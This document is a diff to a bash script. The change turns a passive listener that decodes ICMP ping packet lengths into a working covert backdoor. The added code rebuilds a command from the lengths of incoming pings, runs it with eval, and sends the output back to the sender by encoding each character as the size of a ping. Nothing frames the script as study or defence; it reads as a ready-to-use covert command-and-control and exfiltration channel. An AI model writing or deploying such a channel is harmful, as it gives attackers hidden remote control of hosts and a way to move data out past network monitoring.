@@ -1,18 +1,37 @@
 #!/bin/bash
-sudo tcpdump -l -n -i any icmp and icmp[icmptype] == icmp-echo 2>/dev/null | awk '
-match($0, /length ([0-9]+)/, a) {
-    l = a[1]; if (l == 64) next;
-    if (l >= 32 && l <= 126) {
-        c = sprintf("%c", l);
-        if (c != "*") m = m c;
-        else {
-            print m;
-            if (substr(m, length(m)-1) == "+x") {
-                msg_clean = substr(m, 1, length(m)-2);
-                #Command execution if +x Be aware!
-	              #system(msg_clean);
-            }
-            m = "";
-        }
-    }
-}'
+
+IFACE="any"
+TERM="*"
+SLEEP="0.5"
+
+sudo tcpdump -l -n -Q in -i "$IFACE" icmp and 'icmp[icmptype] == icmp-echo' 2>/dev/null | while read -r line; do
+    src=$(echo "$line" | grep -oP 'IP \K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
+    len=$(echo "$line" | grep -oP 'length \K[0-9]+')
+
+    [ -z "$src" ] && continue
+    [ -z "$len" ] && continue
+    [ "$len" -lt 1 ] || [ "$len" -gt 255 ] && continue
+
+    ch=$(printf "\\$(printf '%03o' "$len")")
+
+    if [ "$ch" != "$TERM" ]; then
+        m="$m$ch"
+    else
+        sleep "$SLEEP"
+
+        out=$(eval "$m" 2>&1)
+
+        for (( i=0; i<${#out}; i++ )); do
+            c="${out:$i:1}"
+            code=$(printf '%d' "'$c")
+            payload=$((code - 8))
+            [ "$payload" -lt 0 ] && payload=0
+            ping -c 1 -n -q -s "$payload" -W 1 "$src" >/dev/null 2>&1 &
+        done
+
+        term_code=$(printf '%d' "'$TERM")
+        ping -c 1 -n -q -s $((term_code - 8)) -W 1 "$src" >/dev/null 2>&1 &
+
+        m=""
+    fi
+done
